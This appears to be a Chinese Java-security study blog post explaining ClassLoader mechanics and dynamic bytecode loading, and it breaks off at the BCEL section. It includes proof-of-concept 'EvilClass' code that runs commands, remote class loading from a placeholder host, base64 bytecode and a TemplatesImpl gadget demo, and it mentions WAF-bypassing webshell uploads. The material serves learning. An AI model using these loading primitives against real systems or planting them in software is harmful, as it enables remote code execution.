# Java安全学习—ClassLoader

Author: H3rmesk1t

# 类加载机制

`Java`是一种依赖于`JVM`实现的跨平台的开发语言，`Java`程序在运行前需要先编译为`class`文件。`Java`类在初始化时会调用`java.lang.ClassLoader`加载类字节码，而`ClassLoader`方法会调用`JVM`的`native`方法(`defineClass0/1/2`)来定义一个`java.lang.Class`实例，在`.class`文件中保存着`Java`代码转换之后的虚拟机指令，当需要某个类的时候，`JVM`虚拟机会加载对应的`.class`文件，并创建对应的`class`对象，将`class`文件加载进虚拟机的内存中。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTYxN2MxMjNjYjNjZTk0OTE1NTdiNDU2ZWU2OTA3YzJfSloxcUJ1MlR2TENNMWJvSnhIdlJvTWtRdlhoNXZTWDdfVG9rZW46Ym94Y251MjJXU0NaTEJ6TGJlMHNLNkJXaXFmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

- 类加载机制具体的实现步骤分为三大块：

   - 加载：是指将`class`文件读入内存，并为之创建一个`java.lang.Class`对象。(程序中使用任何类时，系统均会建立一个对应的`java.lang.Class`对象，系统中的所有类都是`java.lang.Class`的实例)
  - 连接：该阶段负责将类的二进制数据合并到`jre`中。
    - 验证：确保加载的类信息符合`JVM`虚拟机规范，且无安全方面的问题。
    - 准备：为类的静态`Field`分配内存并设置初始值。
    - 解析：将类的二进制数据中的符号引用替换成直接引用。
  - 初始化：该阶段为类加载的最后阶段，当类存在超类时，会对其进行初始化，执行静态初始化器和静态初始化成员变量。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=YjUzOTU1ODExMTUwMmZhNGM1MGFjNDYzNGZhM2FiZTdfN0dLQVJVM2oxUmtPZGp4clZ5QUhlVTNPbTN0a3RveFJfVG9rZW46Ym94Y25SWDNYdWVYNFVCYVp2WERCMHdJYktoXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

# 双亲委派机制

## 工作原理

双亲委派机制是`Java`类加载的核心，该机制一定程度的保证了类加载的安全性。如果一个类加载收到了类加载请求，它并不会先自己进行加载，而是将该请求委托给父加载器帮忙载入，如果父加载器还存在其父加载器，则进一步向上委托，依次递归。若不存在父加载器时，则会使用`BootStrapClassLoader`进行加载。当所有的父加载器都找不到对应的类时，才由自己依照自己的搜索路径搜索类，如果此时还是无法搜到到时，则会抛出异常`ClassNotFoundException`。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=N2FkYTUzMGI3NTFjODlhNGZlMmMxZTMxYjY4Y2UwZDhfV204NlJEZ1lxUUVJbFlmb3lid3c0UUZJa3lDWVFWNFhfVG9rZW46Ym94Y25lcWtqdkhQcWZnM0w3VFF5MnE0MFZiXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## 本质

类加载顺序为：引导类加载器优先加载，无法加载时由扩展类加载器加载，仍然无法加载时才会由应用类加载器或自定义的类加载器进行加载。

# ClassLoader类加载器

## 概述

在`Java`中，所有的类必须经过`JVM`加载后才能运行。编译成`class`字节码后的文件会使用类加载器加载字节码，而`ClassLoader`的主要作用就是`Java`类的加载。

在`JVM`类加载器中最顶层的是`Bootstrap ClassLoader`(引导类加载器)、`Extension ClassLoader`(扩展类加载器)、`Application ClassLoader`(应用类加载器)。其中，`AppClassLoader`是默认的类加载器，`ClassLoader.getSystemClassLoader()`返回的系统加载器也是`AppClassLoader`。并且当类加载时不指定类加载器的情况下，默认会使用`AppClassLoader`去加载类。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQyY2VjZTllZmFlYTg2Yzk5MzA1MjIzZGVjNzliZmNfRkNwSVkzcEk5ZWpGSWh4eDJCekZOaUJ5b2s4UDUwMkJfVG9rZW46Ym94Y25lWjRKVmp6RklNQ0JwdWpjb1d6RG9iXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## 核心方法

```Java
loadClass    # 加载指定的Java类
findClass    # 查找指定的Java类
findLoaderClass    # 查找JVM已经加载过的Java类
defineClass    # 定义一个Java类
resolveClass    # 链接指定的Java类
```

# 自定义ClassLoader

## 遵循双亲委派机制

`java.lang.ClassLoader`是所有类加载器的父类，在其中有着许多子加载器，例如用于加载`jar`包的`java.lang.URLClassLoader`，它通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录`class`文件以及远程资源文件。

在正常情况下，当`OpenCalculatorClass`类存在时，可以直接通过`new OpenCalculatorClass()`来调用`OpenCalculatorClass`类中的方法。但是当该类不存在于`classpath`且由需要调用该类中方法时，便可以使用自定义加载器重写`findClass`方法，接着在调用`defineClass`方法时传入`OpenCalculatorClass`类的字节码来向`JVM`中定义一个`OpenCalculatorClass`类，最后利用反射机制调用`OpenCalculatorClass`类中的方法。

```Java
package com.security;

public class OpenCalculatorClass {

    public void calc() throws Exception {

        Runtime.getRuntime().exec("calc");
    }
}
package com.security;

import sun.misc.IOUtils;

import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Arrays;

public class ConvertByteCodeClass {

    public static void main(String[] args) throws Exception {

        InputStream fis = new FileInputStream("C:\\Users\\95235\\Desktop\\security\\src\\main\\java\\OpenCalculatorClass.class");
        byte[] bytes = IOUtils.readFully(fis, -1, false);
        System.out.println(Arrays.toString(bytes));
    }
}

// [-54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 16, 10, 0, 17, 0, 18, 8, 0, 11, 10, 0, 17, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 99, 97, 108, 99, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 22, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 24, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 12, 0, 26, 0, 27, 1, 0, 32, 99, 111, 109, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 11, 0, 8, 0, 2, 0, 9, 0, 0, 0, 38, 0, 2, 0, 1, 0, 0, 0, 10, -72, 0, 2, 18, 3, -74, 0, 4, 87, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 7, 0, 9, 0, 8, 0, 12, 0, 0, 0, 4, 0, 1, 0, 13, 0, 1, 0, 14, 0, 0, 0, 2, 0, 15]
package com.security;

import java.lang.reflect.Method;

public class CalculatorClassLoader extends ClassLoader {

    public static final String calculatorClassName = "com.security.OpenCalculatorClass";

    public static byte[] calculatorClassBytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 16, 10, 0, 17, 0, 18, 8, 0, 11, 10, 0, 17, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 99, 97, 108, 99, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 22, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 24, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 12, 0, 26, 0, 27, 1, 0, 32, 99, 111, 109, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 11, 0, 8, 0, 2, 0, 9, 0, 0, 0, 38, 0, 2, 0, 1, 0, 0, 0, 10, -72, 0, 2, 18, 3, -74, 0, 4, 87, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 7, 0, 9, 0, 8, 0, 12, 0, 0, 0, 4, 0, 1, 0, 13, 0, 1, 0, 14, 0, 0, 0, 2, 0, 15};

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理CalculatorClass类
        if (name.equals(calculatorClassName)) {
            // 调用JVM的native方法定义CalculatorClass类
            return defineClass(calculatorClassName, calculatorClassBytes, 0, calculatorClassBytes.length);
        }

        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义的类加载器
        CalculatorClassLoader calculatorClassLoader = new CalculatorClassLoader();

        try {
            // 使用自定义的类加载器加载CalculatorClass类
            Class calculatorClass = calculatorClassLoader.loadClass(calculatorClassName);
            // 反射创建CalculatorClass类 <=> CalculatorClass calculatorClass = new CalculatorClass();
            Object obj1 = calculatorClass.newInstance();
            // 反射获取OpenCalculatorClass方法
            Method method = obj1.getClass().getMethod("calc");
            // 反射调用OpenCalculatorClass方法
            Object obj2 = method.invoke(obj1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=N2YxZGFmYmM5NjgzOWIwMDYxYTUwODAxNzQzYTdiN2NfS2lLVk5yY2tpT0liRVVySXpzMHdsQVliSWNPamtIdHZfVG9rZW46Ym94Y245bzBSZzhQZU9LU0F4VHQ1ZklaaEpkXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## 破坏双亲委派机制

双亲委派机制主要依赖于`ClassLoader`类中的`loadclass`函数实现逻辑，如果直接在子类中重写`loadClass`方法，就可以破坏双亲委派机制。目前存在的一些组件，其类加载机制不符合双亲委派也很正常，应用场景大致有如下几种。

1. `Tomcat`类加载机制：该机制中双亲委派机制的缺点是，当加载同个`jar`包不同版本库的时候，该机制无法自动选择需要版本库的`jar`包。特别是当`Tomcat`等`web`容器承载了多个业务之后，不能有效的加载不同版本库。为了解决这个问题，`Tomcat`放弃了双亲委派模型。`Tomcat`加载机制简单来说，`WebAppClassLoader`负责加载本身的目录下的`class`文件，加载不到时再交给`CommonClassLoader`加载，这和双亲委派刚好相反。

1. `OSGI`模块化加载机制：该机制不再是双亲委派的树桩结构，而是网状结构，没有固定的委派模型，只有具体使用某个`package`或者`class`时，根据`package`的导入导出的定义来构造`bundle`之间的委派和依赖。`vCenter`部署及类加载很大程度上依赖该技术。

1. `JDBC`类加载机制：该机制中双亲委派的缺点是父加载器无法使用子加载器加载需要的类，这个使用场景就在`JDBC`中出现了。 以往`JDBC`的核心类在`rt.jar`中，由根加载器加载，然而现在核心类在不同厂商实现的`jar`包中，根据类加载机制，如果`A`类调用`B`类，则`B`类由`A`类的加载器加载，这也就意味着根加载器要加载`jar`包下的类，很显然这一操作违背了双亲委派机制。为了让父加载器调用子加载器加载需要的类，`JDBC`使用了`Thread.currentThread().getContextClassLoader()`得到线程上下文加载器来加载`Driver`实现类。

# URLClassLoader

`URLClassLoader`实际上就是平时默认使用的`AppClassLoader`的父类，`java.net.URLClassLoader.class`可以用来本地加载资源或者远程加载资源。例如，在上传`WebShell`时便可以尝试上传一个`URLClassLoader`开起来无影响的文件绕`waf`，然后利用该文件远程加载执行命令的`jar`包或者`class`恶意文件。

- 正常情况下，`Java`会根据配置项`sun.boot.class.path`和`java.class.path`中列举到的基础路径(经过处理后的`java.net.URL`类)来寻找`.class`文件来加载，基础路径分为三种：

  - `url`未以`/`结尾，认为这是一个`jar`文件，利用`JarLoader`来寻找类，在`jar`中寻找`.class`文件。
  - `url`以`/`结尾且协议名是`file`，利用`FileLoader`来寻找类，在本地系统中寻找`.class`文件。
  - `url`以`/`结尾且协议名不是`file`，利用最基础的`Loader`来寻找类。

# 动态加载字节码

## URLClassLoader加载远程class文件

在上文提到了在`URLClassLoader`中，要利用基础的`Loader`来寻找类必须是在非`file`协议的情况下。在`Java`中，默认提供了对`file`/`ftp`/`gopher`/`http`/`https`/`jar``/`mailto`/`netdoc`协议的支持。

这里利用`http`协议进行测试加载远程的`class`文件：

```Java
// 恶意类
public class EvilClass {

    public EvilClass() throws Exception {

        Runtime.getRuntime().exec("calc");
    }
}
// 加载远程class文件
package com.security;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLClassLoaderDemo {

    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {

        URL[] urls = {new URL("http://xxx.xxx.xxx.xxx:xxxx/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class clazz = loader.loadClass("EvilClass");
        clazz.newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjIzOGQ4OGNhYTEwYmRmY2UyZTkzYWM3ODM5YzFmM2Vfb3h5dVFxWTZOcFlGVEYwVFVhWDZBYVBNWDhzWWxDT0pfVG9rZW46Ym94Y241bXpwTkNHOEYzN0ZpR2JFOGloWXlnXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## ClassLoader#defineClass加载字节码

- 上文中已经提到了在加载`class`文件的过程中，都是经历着`ClassLoader#loadClass`到`ClassLoader#findClass`到`ClassLoader#defineClass`这个过程的。其中：

  - `loadClass`是从已加载的类缓存、父加载器等位置寻找类(双亲委派机制)，在没找到的情况下会执行`findClass`。
  - `findClass`是根据基础`url`指定的方式来加载类的字节码，可能会在本地文件系统、`jar`包或者是远程`http`服务器上读取字节码，然后交给`defineClass`。
  - `defineClass`是处理前面传入的字节码，将其转换为真正的`Java`类。

需要注意到的是，`ClassLoader#defineClass`是一个保护属性，无法直接在外部访问，不得不利用反射的形式来进行调用。在实际应用中，往往由于`defineClass`方法的作用域是不开放的，因此攻击者很少能直接利用它，但是它却是常用攻击链`TemplatesImpl`的基石。

```Java
package com.security;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class ClassToBase64Demo {

    private static final String filePath = "C:\\Users\\95235\\Desktop\\security\\src\\main\\java\\EvilClass.class";

    public String ClassToBase64Demo(String filePath) throws Exception {

        if (filePath == null) {
            return null;
        }
        try {
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public static void main(String[] args) throws Exception {

        ClassToBase64Demo demo = new ClassToBase64Demo();
        String result = demo.ClassToBase64Demo(filePath);
        System.out.println(result);
    }
}
package com.security;

import java.lang.reflect.Method;
import java.util.Base64;

public class ClassLoaderDefineClassDemo {

    public static void main(String[] args) throws Exception {

        Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);

        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAHAAgHABcMABgAGQEABGNhbGMMABoAGwEACUV2aWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAgABAAKAA0ACwALAAAABAABAAwAAQANAAAAAgAO");
        Class evilClass = (Class) method.invoke(ClassLoader.getSystemClassLoader(), "EvilClass", bytes, 0, bytes.length);
        evilClass.newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=M2JjMzc0MGRlNmZhNDQzZTE1ZDkxMGMzMTU4YmIxNGVfNEtpcDJMd2lnZG9CbTBTYzFGaTVtSno4ZVZORzR2REJfVG9rZW46Ym94Y242TFpDR29tNWFOaVBsV3hUSUNlZjhmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## TemplatesImpl加载字节码

在上文中提到了`defineClass`作用域基本上是不开放的，因此大部分上层开发者不会直接使用`defineClass`方法，但是在`Java`底层中有一些类用到它，例如`TemplatesImple`。

在`com.sun.org``.apache.xalan.internal.xsltc.trax.TemplatesImpl`类中定义了一个内部类`TransletClassLoader`。从源码中可以看到，该类继承了`ClassLoader`，同时也重写了`defineClass`方法，并且没有显示地定义方法的作用域，也就是说此时`defineClass`方法已经由父类的`protected`类型变成了`default`类型的方法(只能在自身或者同包下使用)，从而能够被外部进行调用。

```Java
static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;

     TransletClassLoader(ClassLoader parent) {
         super(parent);
        _loadedExternalExtensionFunctions = null;
    }

    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }

    public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return ret;
     }

    /**
     * Access to final protected superclass member from outer class.
     */
    Class defineClass(final byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
}
```

跟一下`TransletClassLoader`方法，其在`TemplatesImpl`类中被`defineTransletClasses`方法调用。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=NGViNDQ3NzM5N2UxZGQzZTM2ZGNhMThkMmM3NWU2ZGRfTnpkSjFBYVg2OGxiQUFuRUFFTnFTMURVTVRpcll6d2FfVG9rZW46Ym94Y25VbVNwUDJFeGNBS1puYUNGUGRGWUtjXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

继续跟进`defineTransletClasses`方法，其在`TemplatesImpl`类中共被三处调用了。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFhOTc0YTU0YWFkMzU4OTdjNGE4YmU5Y2RmNGY2ZWFfdEg5UWVqeVRiNUNIYkQxRnNMSHduUEhrY0c3SEp5bXBfVG9rZW46Ym94Y25jMENLajFIWkhkb21PcjV6UVh2TmFjXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

简单跟进一下这三个方法：
   - `getTransletClasses`方法在`TemplatesImpl`类中已经没有继续被调用了，固无法利用该方法。
   - `getTransletIndex`方法可以直接作为一个触发的点，但是测试后并没有成功触发。
   - `getTransletInstance`方法在`TemplatesImpl`类中进一步被`public`类型的`newTransformer`方法调用了，经过测试后发现该方法能够成功触发。并且`newTransformer`方法还被`public`类型的`getOutputProperties`方法调用了。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzY2E3NDBhZjliNDI0MGFiOGY5ODU1MjgxM2MyNzlfaDBFTmFMMUFUUGlYRW0zelQ4RHJEbDFlMlJyY1FPWWhfVG9rZW46Ym94Y25LZEdMaVhHMU1nMzNhYjN6QTg0dzVnXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWM3OWQ0YmU0Yzk5MTU5ZGJiMmMyYWU1ZGU0MWRkZjBfTkVhRDZ6VEh0YzBmWmVueVZUMW5mY3NDVGFOelZkb0lfVG9rZW46Ym94Y25naGRYTmxlV3NUMUlqYUhFbTBxU2RZXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

根据上文对调用`defineTransletClasses`方法的三处方法的分析，总结一下可以得到两条利用链(实际上就一条，第二条以第一条为前提进行实现)。

```Java
[1] TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()->TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
[2] TemplatesImpl#getOutputProperties() ->TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()->TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```

知道了`TemplatesImpl`类是如何利用`defineClass`来加载字节码原理后，接着来看看该如何在代码层面上进行实现。

其中，在`getTransletInstance`方法中需满足：`_name`不为空。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2I4MmVmODg4ZjAyMDVkYjgxYmNmYWFlMGIxY2MwNWFfalpSZHhiTGgwVWsxRGNDek1aU3UxYm5aTDA4QlY4d2RfVG9rZW46Ym94Y25HUWNZMmN1ZU1MU2RUWnBudWlWeFdCXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

在`defineTransletClasses`方法中需满足：`_bytecodes`是由字节码组成的数组，并且根据`superClass.getName().equals(`*`ABSTRACT_TRANSLET`*`)`可以看出`TemplatesImpl`类中对加载的字节码是存在限制条件的，该字节码对应的类必须是`com.sun.org``.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTkzMjA4MzY2Njk0MTNiNWE3OTIzNWFmYTgzYTM0ZDBfSXo4YUNCb1NoZElYc1BYSnhQRFdqMXRsaUFvenNVbGxfVG9rZW46Ym94Y25SbkF5RDBoWFV0NnRiRnBtWEJKdVllXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

除此之外，在`defineTransletClasses`方法中还会调用`_tfactory.getExternalExtensionsMap()`，此时如果为`null`是会出错，因此`_tfactory`是一个`TransformerFactoryImpl`对象。

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA1YzMzNzNjZGRhNmY1OWYwOTZjOTQzYWIwNTVjN2FfY1NPSGVSNjlabEk3Sjg2dW8wZ1lwNVdOZnRXSkZtQ2hfVG9rZW46Ym94Y25mODBmOFNsNjVBblNDalpYYzhxSVcxXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

根据上文的分析，不难写出`TemplatesImpl`加载字节码的利用代码了。

```Java
// 特殊类
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesClass extends AbstractTranslet {

    public EvilTemplatesClass() throws Exception {
        super();
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
package com.security;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;

public class TemplatesImplClassLoaderDemo {

    public static void main(String[] args) throws Exception {

        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABdFdmlsVGVtcGxhdGVzQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAARjYWxjDAAfACABABJFdmlsVGVtcGxhdGVzQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAARAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFgALAAAABAABAA8AAQARAAAAAgAS");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "h3rmesk1t");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        templates.getOutputProperties();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk2MmY3MDMxZjYzZGUzMzMyZWQwNTQyZmYwNWExODJfSnFsbkNtaG9BQUN5MVBtbFlMbWVRcTV5enRrU2ZEallfVG9rZW46Ym94Y253bXhtNmM4RXhBdUxtNXp0RzNTTjliXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## BCEL ClassLoader加载字节码

### 概述

`BCEL`全名为`Apache Commons BCEL`，属于`Apache Commons`项目下的一个子项目，它是一个用于分析、创建和操纵`Java`类文件的工具库。在`Oracle JDK`中引用了`BCEL`库，但是将原来的包名`org.apache.bcel.util.ClassLoader`修改为了`com.sun.org``.apache.bcel.internal.util.ClassLoader`，`BCEL`的类加载器在解析类名时会对`ClassName`中有`$$BCEL$$`标识的类做特殊处理，该特性常用于编写各类攻击`exp`，例如在`fastjson`漏洞中的利用。

### 原理

